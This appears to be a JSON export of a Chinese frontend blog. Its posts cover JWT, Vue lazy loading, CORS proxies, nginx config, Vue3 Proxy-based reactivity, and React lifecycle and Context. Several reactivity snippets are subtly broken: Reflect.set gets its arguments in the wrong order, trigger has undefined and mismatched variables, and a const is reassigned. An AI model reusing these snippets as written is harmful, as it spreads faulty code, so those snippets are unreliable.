JWT中的负载可以存储常用信息，用于信息交换，有效地使用JWT，可以降低服务端查询数据库的次数 JWT缺点：到期问题：由于服务器不保存Session状态，因此无法在使用过程中废除某个Token,或者更改token的权限，也就是说，一旦JWT一旦签发，在到期之前就会始终有效，除非服务器部署额外的逻辑 性能优化：路由懒加载1 什么叫路由懒加载？也叫延迟加载，即在需要的时候进行加载 2 为什么需要路由懒加载？ 首先，路由通常会定义很多不同的页面 这个页面在项目build打包后，一般情况下，会放在一个单独的js文件中 但是，如果很多页面都放在同一个js文件中，必然会造成这个页面非常大 如果我们一次性地从服务器中请求这个页面，可能会花费一定的时间，用户体验不好 为了避免这种情况，我们把不同路由对应的组件分割成不同的代码块，然后当路由被访问的时候才加载对应组件，这就是路由懒加载 实现方式：Vue异步组件12345&#123; path:&#x27;/problem&#x27;, name:&#x27;problem&#x27;, component:resolve=&gt;require([&#x27;../pages/problemList&#x27;],resolve)&#125; ES6中的import()—推荐使用123456routes:[&#123; path:&#x27;/&#x27;, name:&quot;通讯录&quot;, component:()=&gt;Promise.resolve(import(&quot;../components/contact/contact.vue&quot;)) &#125;,] webpack的require.ensure()多个路由指定相同的chunkName,会合并打包成一个js文件，require.ensure可实现按需加载资源，包括js,css，它会给里面的require文件单独打包，不会和主文件打包在一起。 第一个参数是数组，表明第二个参数里需要加载的模块，这些会提前加载， 第二个是回调函数，在这个回调函数里面requrie的文件会被单独打包成一个chunk,不会和主文件打包在一起，这样就生成两个chunk,第一次加载时只加载主文件 第三个参数是错误回调 第四个参数是单独打包的chunk的文件名 12345678910111213141516import Vue from &#x27;vue&#x27;;import Router from &#x27;vue-router&#x27;;const HelloWorld=resolve=&gt;&#123; require.ensure([&#x27;@/components/HelloWorld&#x27;],()=&gt;&#123; resolve(require(&#x27;@/components/HelloWorld&#x27;)) &#125;) &#125;Vue.use(&#x27;Router&#x27;)export default new Router(&#123; routes:[&#123; &#123;path:&#x27;./&#x27;, name:&#x27;HelloWorld&#x27;, component:HelloWorld &#125; &#125;]&#125;) element-plus按需加载：配置vue.config.js1234567configureWebpack:&#123; plugins:[ require(&#x27;unplugin-element-plus/webpack&#x27;)(&#123; &#125;), ] &#125; UglifyPlugin Webpack Plugin 插件用来缩小js文件vue.config.js: 12345678910111213141516171819configureWebpack:&#123; plugins:[ require(&#x27;unplugin-element-plus/webpack&#x27;)(&#123; &#125;), //代码压缩 new UglifyJsPlugin(&#123; uglifyOptions:&#123; compress:&#123; drop_debugger:true, drop_console:true, pure_funcs:[&#x27;console.log&#x27;] &#125; &#125;, sourceMap:false, parallel:true &#125;) ], &#125;, 封装axios:特征： 从浏览器创建XMLHttpRequests 从node.js创建http请求 支持Promise API 拦截请求和响应 转换请求和响应数据 取消请求 自动转换JSON数据 客户端支持防御XSRF 具体：https://coloey.github.io/2022/04/11/Vue%E4%B8%AD%E5%B0%81%E8%A3%85axios%E8%AF%B7%E6%B1%82/ 跨域处理方法：服务端配置cors:1234567const cors=require(&#x27;cors&#x27;)const io=require(&#x27;socket.io&#x27;)(server,&#123; //服务端配置cors cors: &#123; origin: &quot;https://coloey.github.io&quot; &#125;&#125;) 本地配置proxy代理转发路由表：原理：在本地运行的npm run serve 等命令实际上是用node运行了一个服务器，因此，proxyTable实际上是将请求转发给自己的服务器，再由服务器转发给后台服务器，做了一层代理，vue的proxyTable用了proxy-middleware中间件，不会出现跨域问题 如果接口里面有个公共的名字，比如security,可以拿出来做来做跨域配置： 12345678910111213141516171819module.exports = &#123; devServer: &#123; open: true, host: &#x27;localhost&#x27;, port: 8000, https: false, //以上的ip和端口是我们本机的;下面为需要跨域的 proxy: &#123; //配置跨域 &#x27;/security&#x27;: &#123; target: &#x27;http://127.0.0.1:8000/&#x27;, //要代理到的api地址 ws: true, changOrigin: true, //允许跨域 pathRewrite: &#123; &#x27;^/security/&#x27;: &#x27;/security&#x27; &#125; &#125; &#125; &#125;&#125; 如果接口中没有公共部分，另外设置一个代理名称，用api设置代理转发，接口请求就需要带上api.HTTP请求代理中多了ws:false属性，如果不加这个属性，浏览器控制台会一直报连接不上socket的错误 12345678910111213141516171819let proxyObj = &#123;&#125;;proxyObj[&#x27;/ws&#x27;] = &#123; ws: true, target: &quot;ws://localhost:8081&quot;,//目标服务器&#125;;proxyObj[&#x27;/api&#x27;] = &#123; ws: false, target: &quot;http://localhost:8081&quot;, changeOrigin: true, pathRewrite: &#123; &#x27;^/api&#x27;: &#x27;/api&#x27; &#125;&#125;;module.exports = &#123; devServer: &#123; host: &#x27;localhost&#x27;, port: 8080, proxy: proxyObj 这个设置只有在本地的时候是起作用的，当项目编译打包时，配置不会打包进去。 生产环境让后台配置cors或者nginx将前端代码拷贝到后端，在nginx.conf中配置，以Vue为例，如果是SPA应用，项目打包后是一个index.html还有几个js,css等文件，这些静态文件上传到服务器，在nginx.conf中配置静态资源访问： 1234location ~ .*\\.(js|css|ico|png|jpg|eot|svg|ttf|woff|html|txt|pdf|) &#123; root /usr/local/nginx/html/;#所有静态文件直接读取硬盘 expires 30d; #缓存30天&#125; 即后缀为js,css,ico等文件统统不进行请求转发，直接从本地的/usr/local/nginx/html目录下读取并返回到前端（我们需要将静态资源文件上传到/usr/local/nginx/html/目录下） 聊天功能实现：socket.io的主要靠emit()和on()实现实时聊天，关键在于设计对话的数据结构，对话用一个对象保存，里面包含发送者姓名，接收者姓名，信息，将对话展示在对话页面中主要靠fromUser,toUser识别，根据路由参数显示对话列表，每个用户登录将用户名作为参数通过emit触发服务端addUser，服务端用一个onLineUsers对象存储socket对象，键为用户名，值为用户socket对象，每个socket对象是唯一的，服务端on监听sendMessage事件，客户端emit触发sendMessage事件,当服务端的sendMessage事件被客户端触发后回调函数执行，触发客户端展示消息的函数，表情包发送是通过写一个emoji表情包子组件，通过和对话列表父组件进行通信，点击表情包Icon,展示一个表情包列表，点击里面任意一个表情，子组件触发emit(chooseEmoji,emoji),传递emoji信息给父组件的chooseEmoji函数，父组件就能在输入框中显示被选中的emoji","categories":[{"name":"项目总结","slug":"项目总结","permalink":"https://coloey.github.io/categories/%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/"}],"tags":[]},{"title":"antd初始化表单","slug":"antd初始化表单","date":"2022-08-12T13:41:44.000Z","updated":"2022-08-12T13:41:44.210Z","comments":true,"path":"2022/08/12/antd初始化表单/","link":"","permalink":"https://coloey.github.io/2022/08/12/antd%E5%88%9D%E5%A7%8B%E5%8C%96%E8%A1%A8%E5%8D%95/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"代理数组","slug":"代理数组","date":"2022-08-04T03:38:19.000Z","updated":"2022-08-04T06:59:22.296Z","comments":true,"path":"2022/08/04/代理数组/","link":"","permalink":"https://coloey.github.io/2022/08/04/%E4%BB%A3%E7%90%86%E6%95%B0%E7%BB%84/","excerpt":"","text":"对数组元素或者属性的读取操作：通过索引访问数组元素值:arr[0] 访问数组的长度:arr.length 把数组作为对象，使用for…in循环遍历 使用for…of迭代遍历数组 数组的原型方法，如concat/join/every/some/find/findIndex/includes等，以及不改变原数组的原型方法 1 数组索引与length通过索引设置数组元素的值时，会执行内部方法[[Set]],内部方法[[Set]]依赖于[[DefineOwnProperty]],当设置的索引值大于数组当前长度，更新数组length属性，触发与length属性相关联的副作用函数重新执行，修改set拦截函数 1234567891011121314151617181920212223242526set(target,key,newValue)&#123; //如果是只读的打印警告信息 if(isReadOnly)&#123; console.warn(`属性$&#123;key&#125;是只读的`) &#125; //获取旧值 const oldValue=target[key] //如果代理目标对象是数组，则检测被设置的索引值是否小于数组长度 //如果是，则为SET操作，否则为ADD操作 const type=Array.isArray(target) ?Number(key)&lt;length?&#x27;SET&#x27;:&#x27;ADD&#x27; :Object.prototype.hasOwnProperty.call(target,key)?&#x27;SET&#x27;:&#x27;ADD&#x27; //设置属性值 const res=Reflect.set(target,key,receiver,newValue) //说明receiver是target的代理对象 if(target===receiver.raw)&#123; //比较新值和旧值，只有当它们不全等并且都不是NAN才触发响应 if(oldValue!==newValue&amp;&amp;(oldValue===oldValue||newValue===newValue))&#123; //假如设置数组length属性为0，会影响数组元素，因此要触发新的响应 trigger(target,key,type,newValue) &#125; &#125; return true; &#125; 12345678910111213141516171819202122function trigger(target,key)&#123; const depsMap=bucket.get(target) if(!depsMap)return const effects=depsMap.get(key) const effectsToRun=new Set(effects) //当操作类型是ADD或者DELETE,需要触发与length相关的副作用函数执行 if(type===&#x27;ADD&#x27;||type===&#x27;DELETE&#x27;)&#123; const iterateEffects=depsMap.get(&#x27;length&#x27;) lengthEffects&amp;&amp;lengthEffects.forEach(effectfn=&gt;&#123; if(effectfn!==activeEffect)&#123; effectsToRun.add(effectfn) &#125; &#125;) &#125; effects&amp;&amp;effects.forEach(effectfn=&gt;&#123; if(activeEffect!=effectfn)&#123;//只有当trigger触发执行的副作用函数和当前正在执行的副作用函数不相同时才触发执行，否则会出现栈溢出 effectsToRun.add(effectfn) &#125; &#125;) effectsToRun.forEach(effectfn=&gt;effectfn()) //effect&amp;&amp;effect.forEach(fn=&gt;fn())//会产生无限执行&#125; 2 数组查找方法arr.includes(arr[0])中arr是代理对象，includes函数执行时this指向的是代理对象，即arr,includes方法会通过索引读取数组元素值，如果值时可以被代理的，那么得到的值就是新的代理对象， 12345function reactive(obj)&#123; //每次调用reactive时都会创建新的代理对象 return createReactive(obj) &#125; 解决方法： 12345678910111213//当参数Obj是相同的不用创建新的代理对象//存储原始对象到代理对象的映射const reactiveMap=new Map()function reactive(obj)&#123; //优先通过原始对象obj查找之前创建的代理对象，如果找到了，直接返回已有的代理对象 const existionProxy=reactiveMap.get(obj) if(existionProxy)return existionProxy //否则创建新的代理对象 proxy=createReactive(obj) reactiveMap.set(obj,proxy) return proxy &#125; 然而，下面这段代码 123const obj = &#123;&#125;;const arr = reactive([obj])console.log(arr.includes[obj])//false includes内部的this指向的是代理对象arr,并且在获取数组元素时得到的也是代理对象，所以用原始对象obj去查找找不到，返回false,因此我们需要重写includes方法 123456789101112131415const arrInstrumentations=&#123;&#125;//重写方法[&#x27;includes&#x27;,&#x27;indexOf&#x27;,&#x27;lastIndexOf&#x27;].forEach(method=&gt;&#123; const originMethod=Array.prototype[method] arrInstrumentations[method]=function(...args)&#123; //先在代理对象中查找，结果存储在res实现了arr.includes(obj)的默认方法 //找不到就去原始数组上查找 const res=originMethod.apply(this,args) //找不到则在原始对象中查找 if(res===false)&#123; res=originMethod.apply(this.raw,args) &#125; &#125; return res;&#125;) 123456789101112get(target,key,receiver)&#123; //通过&quot;raw”属性访问原始对象 if(key===&#x27;raw&#x27;)&#123; return target &#125; //如果操作对象存在于arrInstrumentations上，返回定义在arrInstrumentation上的值 if(Array.isArray(target)&amp;&amp;arrInstrumentations.hasOwnProperty(key))&#123; return Reflect.get(arrInstrumentations,key,receiver) &#125; ...&#125; 3 push/pop/shift/unshift等方法当调用数组的push方法时，即会读取数组length属性值也会设置数组length属性值，会导致两个独立的副作用函数相互影响，就像 123const arr=reactive([])effect=(()=&gt;&#123;arr.push(1)&#125;)effect=(()=&gt;&#123;arr.push(1)&#125;) 会得到栈溢出的错误 分析： 第一个副作用函数执行，在该函数内，调用arr.push方法向数组中添加一个元素，调用数组push方法时会间接读取数组的length属性，所以第一个副作用函数执行完毕会与length属性建立响应联系 第二个副作用函数执行，同样，与length属性建立响应联系，同时调用arr.push会设置length属性，于是响应式系统尝试把与length有关的副作用函数全部取出执行，就包括第一个副作用函数，此时，第二个副作用函数还未执行完毕就去调用第一个副作用函数 第一个副作用函数再次执行，也会间接设置数组的length属性，于是响应系统又尝试把所以与length属性相关联娿副作用取出执行，其中包括第二个副作用函数 循环往复导致栈溢出 因此，我们可以通过屏蔽对length属性的读取，避免在它与副作用函数之间建立联系 123456789101112131415//一个标记变量，代表是否追踪let shouldTrack = true[&#x27;push&#x27;].forEach(method=&gt;&#123; //取得原始push方法 const originMethod = Array.prototype[method] //重写 arrInstrumentations[method] = function(...args)&#123; //在调用方法前禁止追踪 shouldTrack=false; let res = originMethod.apply(this,args) //调用原始方法后，恢复原来行为，即允许追踪 shouldTrack=true return res &#125;&#125;) 在执行默认行为之前先将shouldTrack置false,禁止追踪，当push方法默认行为执行完毕后，将shouldTrack还原为true, 12345function track(target,key)&#123; //禁止追踪时直接返回 if(!activeEffect || !shouldTrack)return ...&#125; 当push方法间接读取length属性，由于此时是禁止追踪状态，所以length属性与副作用函数之间不会建立响应联系，也就不会产生栈溢出","categories":[{"name":"Vue3源码","slug":"Vue3源码","permalink":"https://coloey.github.io/categories/Vue3%E6%BA%90%E7%A0%81/"}],"tags":[]},{"title":"代理object","slug":"代理object","date":"2022-07-31T07:01:57.000Z","updated":"2022-08-04T03:43:09.790Z","comments":true,"path":"2022/07/31/代理object/","link":"","permalink":"https://coloey.github.io/2022/07/31/%E4%BB%A3%E7%90%86object/","excerpt":"","text":"对一个普通对象所有可能的读取操作： 访问属性：obj.foo 判断对象原型上是否存在给定属性key in obj 使用for…in循环遍历对象:for(const key in obj){} 1、对于属性的读取直接用get拦截函数 2、对于in 操作符，用has拦截函数代理 1234567const obj=&#123;foo:1&#125;const p= new Proxy(obj,&#123; has(target,key)&#123; track(target,key) return Reflect.has(target,key) &#125;&#125;) 3、对于for…in的拦截，使用Reflect.ownKeys() 用ownKeys来获取一个对象中的所有属于自己的键值时，这个操作明显不与任何键绑定，因此我们只能够构造唯一的key作为标识（用Symbol构造），即ITERATE_KEY export const ITERATE_KEY = Symbol(DEV ? ‘iterate’ : ‘’) 修改属性不会对for循环产生影响，因为无论怎么修改一个值，对于for…in循环来说都只会循环一次，如果是添加属性或者删除属性，就会触发副作用函数重新执行 12345678910111213141516171819202122function trigger(target,key)&#123; const depsMap=bucket.get(target) if(!depsMap)return const effects=depsMap.get(key) const effectsToRun=new Set(effects) //当操作类型是ADD或者DELETE,需要触发与ITERATE_KEY相关的副作用函数执行 if(type===&#x27;ADD&#x27;||type===&#x27;DELETE&#x27;)&#123; const iterateEffects=depsMap.get(ITERATE_KEY) iterateEffects&amp;&amp;iterateEffects.forEach(effectfn=&gt;&#123; if(effectfn!==activeEffect)&#123; effectsToRun.add(effectfn) &#125; &#125;) &#125; effects&amp;&amp;effects.forEach(effectfn=&gt;&#123; if(activeEffect!=effectfn)&#123;//只有当trigger触发执行的副作用函数和当前正在执行的副作用函数不相同时才触发执行，否则会出现栈溢出 effectsToRun.add(effectfn) &#125; &#125;) effectsToRun.forEach(effectfn=&gt;effectfn()) //effect&amp;&amp;effect.forEach(fn=&gt;fn())//会产生无限执行&#125; 如何屏蔽由原型引起的更新： 12345678910const obj=&#123;&#125;const proto=&#123;bar:1&#125;const child=reactive(obj)const parent=reactive(proto)//使用parent作为child的原型Object.setPrototypeOf(child,parent)effect(()=&gt;&#123; console.log(child.bar)//1&#125;)child.bar=2//会导致副作用重新执行两次 根据规范10.1.9.2: 如果ownDesc是undefined,那么： a.让parent的值为O.[[GetPrototypeOf]] () b.如果parent不是null,则 ​ 返回？parent.[[Set]] (P,V,Receiver) c.将ownDesc设置为{[[Value]]:undefined,[[Writable]]:true,[[Enumerable]]:true,[[Configurable]]:true} 如果设置的属性不在对象上，那么就会取得原型，并调用其原型上的方法，也就是parent[[Set]]内部方法，由于parent是代理对象，所以相当于执行了它的set拦截函数，因此读取child.bar时，副作用函数被child.bar收集，还被parent.bar收集 需要屏蔽一次，而parent代理对象的set函数执行时，此时target是原始对象proto，receiver是代理对象child,不再是target的代理对象，由于最初设置child.bar，receiver一直都是child,target是变化的 只有当receiver是target的代理对象时才触发更新，就能屏蔽由原型引起的更新 123456789101112131415161718192021222324252627282930function reactive(obj)&#123; return new Proxy(obj,&#123; get(target,key,receiver)&#123; //通过&quot;raw”属性访问原始对象 if(key===&#x27;raw&#x27;)&#123; return target &#125; track(target,key) return Reflect.get(target,key,receiver) &#125;, set(target,key,newValue)&#123; //获取旧值 const oldValue=target[key] const type=Object.prototype.hasOwnProperty.call(target,key)?&#x27;SET&#x27;:&#x27;ADD&#x27; //设置属性值 const res=Reflect.set(target,key,receiver,newValue) //说明receiver是target的代理对象 if(target===receiver.raw)&#123; //比较新值和旧值，只有当它们不全等并且都不是NAN才触发响应 if(oldValue!==newValue&amp;&amp;(oldValue===oldValue||newValue===newValue))&#123; trigger(target,key) &#125; &#125; return true; &#125; &#125;)&#125;","categories":[{"name":"Vue3源码","slug":"Vue3源码","permalink":"https://coloey.github.io/categories/Vue3%E6%BA%90%E7%A0%81/"}],"tags":[]},{"title":"理解vue3中Proxy和Reflect","slug":"理解vue3中Proxy和Reflect","date":"2022-07-31T02:42:33.000Z","updated":"2022-07-31T07:00:40.451Z","comments":true,"path":"2022/07/31/理解vue3中Proxy和Reflect/","link":"","permalink":"https://coloey.github.io/2022/07/31/%E7%90%86%E8%A7%A3vue3%E4%B8%ADProxy%E5%92%8CReflect/","excerpt":"","text":"理解Proxy：1、使用Proxy可以代理一个对象，它能够实现对其他对象的代理，代理指的是对一个对象的基本语义的代理 基本语义：可以对一个对象进行读取，设置属性值的操作。 2、根据ECMAScript规范，在JavaScript中有两种对象，一种是常规对象，一种是异质对象，这两种对象包含了JavaScript世界中所有对象。 在JavaScript中，对象的实际语义是由对象的内部方法指定的，内部方法指的是对一个对象进行操作时在引擎内部调用的方法，这些方法对于js使用者来说是不可见的，比如[[Get]],[[Set]],[[GetPrototyeOf]],[[SetPrototypeOf]]等方法， 3、区分普通对象和函数：函数会部署内部方法[[Call]]，而普通对象不会 4、常规对象需满足： 对于内部[[Get]],[Set],必须使用ECMA规范10.1.x节给出的定义实现 对于内部方法[[Call]],必须使用ECMA规范10.2.1节给出的定义实现 对于内部方法[[Construct]]，必须使用ECMA规范10.2.2节给出的定义实现 而Proxy对象的内部方法[[Get]]没有使用ECMA规范10.1.8给出的定义实现，所以Proxy是一个异质对象，因此代理对象与普通对象的区别是[[Get]]的实现，代理对象会在没有指定对应拦截函数，例如没有指定get函数，当我们通过代理随性访问属性值时，代理对象内部方法[[Get]]会调用原始对象内部方法[[Get]]来获取属性值，这其实就是代理透明性质 使用Reflect:Reflect对象的设计目的有这样几个。 （1） 将Object对象的一些明显属于语言内部的方法（比如Object.defineProperty），放到Reflect对象上。现阶段，某些方法同时在Object和Reflect对象上部署，未来的新方法将只部署在Reflect对象上。也就是说，从Reflect对象上可以拿到语言内部的方法。 （2） 修改某些Object方法的返回结果，让其变得更合理。比如，Object.defineProperty(obj, name, desc)在无法定义属性时，会抛出一个错误，而Reflect.defineProperty(obj, name, desc)则会返回false。 (3） 让Object操作都变成函数行为。某些Object操作是命令式，比如name in obj和delete obj[name]，而Reflect.has(obj, name)和Reflect.deleteProperty(obj, name)让它们变成了函数行为。 (4）Reflect对象的方法与Proxy对象的方法一一对应，只要是Proxy对象的方法，就能在Reflect对象上找到对应的方法。这就让Proxy对象可以方便地调用对应的Reflect方法，完成默认行为，作为修改行为的基础。也就是说，不管Proxy怎么修改默认行为，你总可以在Reflect上获取默认行为。 在响应式中使用Reflect的原因：假如没有使用Reflect 12345678910111213141516const obj=&#123; foo:1, get bar()&#123; return this.foo &#125;&#125;const p= new Proxy(obj,&#123; get(target,key)&#123; track(target,key) return target[key] &#125;, set(targte,key,newVal,receiver)&#123; target[key]=newVal; trigger(target,key) &#125;&#125;) 当在effect函数中通过代理对象p访问bar属性 123effect(()=&gt;&#123; console.log(p.bar)&#125;) 当effect注册的副作用函数执行时，会读取p.bar属性，它发现p.bar是一个访问器属性，因此执行getter函数，由于在getter函数中通过this.foo读取了foo的属性值，因此我们认为副作用函数与属性foo之间会建立联系，当我们修改p.foo的值时却没有使得副作用函数重新执行 原因在于this.foo中的this指向的是target,在代理对象中get函数返回的target[key]相当于obj.bar，在副作用函数中通过原始对象访问它的某个属性不会触发响应，使用Reflect; 123456789101112const p= new Proxy(obj,&#123; get(target,key)&#123; track(target,key) return Reflect.get(target,key) &#125;, set(targte,key,newVal,receiver)&#123; Reflect.set(target,key,newVal,receiver) trigger(target,key) return true &#125;&#125;) receiver代表谁在读取属性，这里就是代理对象p,访问器属性bar的getter函数内this指向代理对象p,这会在副作用函数与响应式数据之间建立响应联系，创建代理对象时指定的拦截函数，实际上是用来自定义代理对象本身的内部方法和行为的，不是用来指定被代理对象的内部方法和行为","categories":[{"name":"Vue3源码","slug":"Vue3源码","permalink":"https://coloey.github.io/categories/Vue3%E6%BA%90%E7%A0%81/"}],"tags":[]},{"title":"非Prop的attribute","slug":"非Prop的attribute","date":"2022-07-29T03:11:27.000Z","updated":"2022-08-25T02:05:59.094Z","comments":true,"path":"2022/07/29/非Prop的attribute/","link":"","permalink":"https://coloey.github.io/2022/07/29/%E9%9D%9EProp%E7%9A%84attribute/","excerpt":"","text":"一个非prop的attribute是指传向一个组件，但是该组件并没有相应props或emits定义的attribute,常见的包括class,style,id attribute，可以通过$attrs property访问那些attribute Attribute继承当组件返回单个根结点，非prop的attribute将自动添加到根结点的attribute中， 1234567app.component(&#x27;date-picker&#x27;,&#123; template:` &lt;div class=&quot;data-picker&quot;&gt; &lt;input type=&quot;datetime-local&quot;&gt; &lt;/div&gt; `&#125;) 1234567//具有非prop的attribute的date-picker组件&lt;date-picker data-status=&quot;activated&quot;&gt;&lt;/date-picker&gt;//渲染后的date-picker组件&lt;div class=&quot;data-picker&quot; data-status=&quot;activated&quot;&gt; &lt;input type=&quot;datetime-local&quot;/&gt; &lt;/div&gt; 同理，事件监听器也会从父组件传递到子组件 1&lt;date-picker @change=&quot;submitChange&quot;&gt;&lt;/date-picker&gt; 123456789app.component(&#x27;date-picker&#x27;, &#123; template: ` &lt;select&gt; &lt;option value=&quot;1&quot;&gt;Yesterday&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;Today&lt;/option&gt; &lt;option value=&quot;3&quot;&gt;Tomorrow&lt;/option&gt; &lt;/select&gt; `&#125;) change事件在原生的change事件上触发，我们不需要显示地从date-picker发出事件 禁用Attribute继承如果不希望组件的根元素继承attribute,可以在组件的选项设置inheritAttrs:false 12345678app.component(&#x27;date-picker&#x27;,&#123; inheritAttrs:false, template:` &lt;div class=&quot;date-picker&quot;&gt; &lt;input type=&quot;datetime-local&quot; v-bind=&quot;$attrs&quot; /&gt; &lt;/div&gt; `&#125;) data-status attribute将用于Input元素 1234567&lt;!-- date-picker 组件使用非 prop 的 attribute --&gt;&lt;date-picker data-status=&quot;activated&quot;&gt;&lt;/date-picker&gt;&lt;!-- 渲染后的 date-picker 组件 --&gt;&lt;div class=&quot;date-picker&quot;&gt; &lt;input type=&quot;datetime-local&quot; data-status=&quot;activated&quot; /&gt;&lt;/div&gt; 多个根结点的Attribute继承具有多个根结点的组件不具有自动attribute贯穿的行为，如果没有显示绑定$attrs，将发出运行时警告 参考vue官网：https://v3.cn.vuejs.org/guide/component-attrs.html","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"虚拟DOM","slug":"虚拟DOM","date":"2022-07-28T14:07:37.000Z","updated":"2022-08-25T02:07:25.814Z","comments":true,"path":"2022/07/28/虚拟DOM/","link":"","permalink":"https://coloey.github.io/2022/07/28/%E8%99%9A%E6%8B%9FDOM/","excerpt":"","text":"命令式框架与声明式框架：命令式框架：关注过程(Jquery) 123$(&#x27;#app&#x27;) .text(&#x27;hello world&#x27;) .on(&#x27;click&#x27;,()=&gt;alert(&#x27;ok&#x27;)) 声明式框架：关注结果(Vue.js) 1&lt;div @click=&#x27;()=&gt;alert(&#x27;ok&#x27;)&#x27;&gt;&lt;/div&gt; 结论：声明式代码的性能不优于命令式代码的性能 声明式代码的更新性能消耗=找出差异的性能消耗+直接修改的性能消耗 Vue3中虚拟DOM的性能：创建JavaScript对象的计算量+创建真实DOM的计算量 比较：纯JavaScript:Js运算+DOM运算（性能因素） 虚拟DOM：创建Js对象（Vnode)+Diff+必要的DOM更新（与数据量变化有关） innerHTML:渲染HTML字符串+销毁所有旧DOM，新建所有新DOM（与模板大小有关） 结论：性能： innerHTML&lt;虚拟DOM&lt;原始JavaScript 心智负担： 虚拟DOM&lt;innerHTML&lt;原生JavaScript 可维护性： 虚拟DOM&gt;innerHTML和原生JS 框架的设计可以有三种选择： 纯运行时 运行时+编译时（Vue3) 纯编译时 1.纯运行时一个树型结构的数据对象 123456const obj=&#123; tag:&#x27;div&#x27;, children:[ &#123;tag:&#x27;span&#x27;,children:&#x27;hello world&#x27;&#125; ]&#125; tag:标签名，children:子节点 render: 12345678910function Render(obj,root)&#123; const el = document.createElement(obj.tag) if(typeof children ===&#x27;string&#x27;)&#123; const text=document.createTextNode(obj,children) el.appendChild(text) &#125;else if(obj.children)&#123; obj.children.forEach((child)=&gt;Render(child,el)) &#125; root.appendChild(el) &#125; 1Render(obj,document.body) 2.运行时+编译时编写一个Compiler函数，把HTML标签编译成树型结构的对象 12345const html=`&lt;div&gt; &lt;span&gt;Hello world&lt;/span&gt; &lt;/div&gt;`const obj=Compiler(html)Render(obj,document.body) 3.纯编译式：(Svelte)12345678&lt;div&gt;&lt;span&gt;hello world&lt;/span&gt;&lt;/div&gt; //就是const div=document.createElement(&#x27;div&#x27;)const span=document.createElement(&#x27;span&#x27;)const text=document.createElement(&#x27;hello wrold&#x27;)span.appendChild(text)div.appendChild(span)document.body.appendChild(div)","categories":[{"name":"Vue3源码","slug":"Vue3源码","permalink":"https://coloey.github.io/categories/Vue3%E6%BA%90%E7%A0%81/"}],"tags":[]},{"title":"生命周期","slug":"生命周期","date":"2022-07-27T10:00:55.000Z","updated":"2022-07-27T14:55:32.769Z","comments":true,"path":"2022/07/27/生命周期/","link":"","permalink":"https://coloey.github.io/2022/07/27/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/","excerpt":"","text":"生命周期执行顺序： 创建时： constructor() static getDerivedStateFromProps() render() 是class组件中唯一必须实现的方法，用于渲染dom,render()方法必须返回reactDOM 不要在render里面setState,否则会触发死循环导致内存崩溃 componentDidMount() 在组件挂载后立即调用，componentDidMount()是发送网络请求，启用事件监听方法的好时机，并且可以在此钩子函数里直接调用setState() 更新时： static getDerivedStateFromProps() shouldComponentUpdate() 在组件更新之前调用，可以控制组件是否进行更新，返回true组件更新，返回false则不更新 shouldComponentUpdate(nextProps,nextState),第一个是即将更新的props值，第二个是即将更新后的state值，可以根据更新前后的props或state来比较加一些限制条件，决定是否更新，进行性能优化，不要 shouldComponentUpdate 中调用 setState()，否则会导致无限循环调用更新、渲染，直至浏览器内存崩溃 render() getSnapshotBeforeUpdate() componentDidUpdate() 会在更新后被立即调用，首次渲染不会执行。包含三个参数，第一个是上一次props值，第二个是上一次state值，如果组件实现了getSnapshotBeforeUpdate()生命周期，第三个snapshot参数传递 卸载时： componentWillUnmount() 在组件即将被卸载或销毁时进行调用，是取消网络请求，移除监听事件，清理DOM元素，清理定时器等操作的好时机 新生命周期钩子： 1. 1static getDerivedStateFromProps(props,state) getDerivedStateFromProps 会在调用 render 方法之前调用，并且在初始挂载及后续更新时都会被调用。它应返回一个对象来更新 state，如果返回 null 则不更新任何内容。 此方法适用于罕见的用例，即 state 的值在任何时候都取决于 props。 2. 1getSnapshotBeforeUpdate(prevProps,prevState) getSnapshotBeforeUpdate()在最近一次渲染输出（提交到DOM结点）之前调用，它使得组件能在发生更改之前从DOM中捕获一些信息，此生命周期方法的任何值返回值将作为参数传递给componentDidUpdate() 例子： 12345678910111213141516171819202122232425class ScrollingList extends React.Component &#123; constructor(props)&#123; super(props); this.listRef=React.createRef(); &#125; getSnapshotBeforeUpdate(prevProps,prevState)&#123; if(prevProps.list.length&lt;this.props.list.length)&#123; const list = this.listRef.current; return list.scrollHeight-list.scrollTop &#125; return null; &#125; componentDidUpdate(prevProps,prevState,snapshot)&#123; if(snapshot!=null)&#123; const list=this.listRef.current; list.scrollTop=list.scrollHeight-snapshot; &#125; &#125; render()&#123; return( &lt;div ref=&#123;this.listRef&#125;&gt;&lt;/div&gt; ) &#125;&#125;","categories":[{"name":"React","slug":"React","permalink":"https://coloey.github.io/categories/React/"}],"tags":[]},{"title":"Context","slug":"Context","date":"2022-07-27T03:02:34.000Z","updated":"2022-07-27T07:54:21.602Z","comments":true,"path":"2022/07/27/Context/","link":"","permalink":"https://coloey.github.io/2022/07/27/Context/","excerpt":"","text":"理解：一种组件间通信方式，用于祖组件和后代组件之间的通信 1.使用Context 2.创建Context容器对象 1const xxxContext = React.createContext(defaultValue) 3.渲染子组件，外面包裹xxxContext.Provider,通过value属性给后代组件传递数据 12&lt;xxxContext.Provider value=&#123;数据&#125;&gt;&lt;/xxxContext.Provider&gt; 4.后代组件读取数据第一种适用于类组件： 12static contextType = xxxContext;//声明接收contextthis.context//context是一个对象，读取context中value的值 第二种函数组件和类组件都可以： 12345678&lt;xxxContext.Consumer&gt; &#123; value=&gt;(//value是context中的value数据 要显示的内容 ) &#125;&lt;/xxxContext.Consumer&gt; 例子： 123456789101112131415161718192021222324252627282930313233const ThemeContext = React.createContext(&#123; value:&quot;blue&quot;&#125;)class A extends React.Component &#123; constructor(props)&#123; super(props) this.state=&#123;value:&quot;red&quot;&#125; &#125; render()&#123; return( &lt;ThemeContext.Provider value=&#123;this.state&#125;&gt; &lt;B/&gt; &lt;/ThemeContext.Provider&gt; ) &#125;&#125;function B()&#123; return( &lt;div&gt; &lt;C/&gt; &lt;/div&gt; )&#125;function C()&#123; return ( &lt;ThemeContext.Consumer&gt; &#123;(&#123;value&#125;)=&gt;( &lt;h1&gt;&#123;value&#125;&lt;/h1&gt; )&#125; &lt;/ThemeContext.Consumer&gt; )&#125; context一般用于封装react插件 使用useContext1const value = useContext(MyContext) 